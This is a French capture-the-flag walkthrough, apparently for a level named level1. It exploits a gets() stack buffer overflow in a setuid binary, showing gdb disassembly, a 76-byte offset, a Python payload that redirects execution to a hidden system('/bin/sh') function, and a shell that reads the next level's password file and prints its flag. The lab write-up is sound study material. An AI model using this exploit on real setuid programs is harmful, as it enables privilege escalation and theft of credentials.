@@ -1,0 +1,96 @@
+On a un programme level1 à la racine.
+$ ls -als
+$ 8 -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+
+on voit encore une voit le petit s qui indique que le programme s'executera avec les droits
+du propriétaire, en l'occurence level2
+
+Avec gdb, on regarde ce que fait le programme quand on le lance :
+$ gdb level1
+(gdb) layout asm
+   │0x8048480 <main>        push   %ebp                                                     │
+   │0x8048481 <main+1>      mov    %esp,%ebp                                                │
+   │0x8048483 <main+3>      and    $0xfffffff0,%esp                                         │
+   │0x8048486 <main+6>      sub    $0x50,%esp                                               │
+   │0x8048489 <main+9>      lea    0x10(%esp),%eax                                          │
+   │0x804848d <main+13>     mov    %eax,(%esp)                                              │
+   │0x8048490 <main+16>     call   0x8048340 <gets@plt>                                     │
+   │0x8048495 <main+21>     leave                                                           │
+   │0x8048496 <main+22>     ret                                                             │
+
+Le programme fait un simple appelle à un gets.
+
+On utilise encore une fois un décompileur pour voir ce qui se cache dans le programme (cf source)
+On peut voir qu'il y a dans le programme un appelle system(/bin/sh).
+Il se trouve dans une fonction (run) qui n'est jamais appelé par le main, ni nul par ailleurs.
+Il faut donc trouver le moyen d'acceder à cette function par un autre moyen.
+Or on voit que le gets est utilisé, et qu'on lui passe en argument un char[64]s.
+Lors de l'écriture dans S, si on écrit trop, il finira par déborder et crasher.
+C'est une faille à exploiter car, une fois que le programme segfault, on se retrouve dans un espace mémoire où on ne devrait pas être,
+et où on peut faire ce qu'on veut.
+
+On va chercher, l'endroit exacte ou le programme segfault, à l'aide d'un site:
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+Ce site permet de generer des caractere uniques.
+Lorsqu'on utilise gdb et que l'on donne au programme cette chaine de caractere unique en argument, lorsqu'il va overflow, gdb va nous renvoyer le caractere qui fait overflow sous forme de 0x..... .
+En donnant l'addresse du caractere qui a fait overflow au site, le site va retrouver le caractere correspondant et nous indiquer le nombre de bytes auquel ca correspond. ainsi on saura ou se trouve l'offset, c'est à dire l'endroit exact ou le programme overflow, apresè combien de bytes il overflow. Ce qui nous permet de l'exploiter en introduisant ce qu'on souhaite à cet endroit precis.
+
+Donc:
+$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" > /tmp/overflow
+$ gdb level1
+(gdb) run < /tmp/overflow
+    Program received signal SIGSEGV, Segmentation fault.
+    0x63413563 in ?? ()
+Donc le programme crash au caractere 0x63413563
+On met l'addresse dans le site, il nous renvoie l'offset : 76
+Le programme segfault au bout de 76 bytes.
+
+Après un segfault, le programme ne se trouve plus en mode lecture du get et considère que tout ce qui vient à la suite est quelque chose qui doit être executer.
+On peut donc faire executer ce que l'on veut une fois le crash. Nous on souhaite rediriger notre programme vers la fonction run où se trouve
+l'appelle system(/bin/sh).
+
+on cherche avec gdb ou se trouve cette fonction run dans la mémoire: 
+$ gdb level1
+(gdb) info function
+    0x080482f8  _init
+    0x08048340  gets
+    0x08048340  gets@plt
+    0x08048350  fwrite
+    0x08048350  fwrite@plt
+    0x08048360  system
+    0x08048360  system@plt
+    0x08048370  __gmon_start__
+    0x08048370  __gmon_start__@plt
+    0x08048380  __libc_start_main
+    0x08048380  __libc_start_main@plt
+    0x08048390  _start
+    0x080483c0  __do_global_dtors_aux
+    0x08048420  frame_dummy
+    0x08048444  run
+    0x08048480  main
+    0x080484a0  __libc_csu_init
+    0x08048510  __libc_csu_fini
+    0x08048512  __i686.get_pc_thunk.bx
+    0x08048520  __do_global_ctors_aux
+    0x0804854c  _fini
+
+La fonction run se trouve à l'addresse 0x08048444
+
+On va donc executer le programme, le faire déborder en écrivant 76 bytes et continuer le programme en redirigeant vers l'addresse de la function run.
+
+$ python -c 'print 76*"A" + "\x08\x04\x84\x44"[::-1]' > /tmp/level1
+$ cat /tmp/level1 | ./level1
+$   Good... Wait what ?
+    Segmentation fault (core dumped)
+On voit que le fwrite(Good... wait what) a focntionné, on est donc bien
+rentré dans la fonction run, le /bin/sh s'est executé aussi mais le programme s'est fermé directement.
+Il faut donc trouvé un moyen de laisser le programme en attente, ouvert pour pouvoir écrire de quoi récupérer le flag.
+Il faudrait qu'il reste ouvert en lecture de stdin.
+
+Or la command cat permet de lire en stdin avec l'option dash (-)
+$ cat /tmp/level1 - | ./level1
+$ cat /home/user/level2/.pass
+    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+$ su level2
+$ password: 
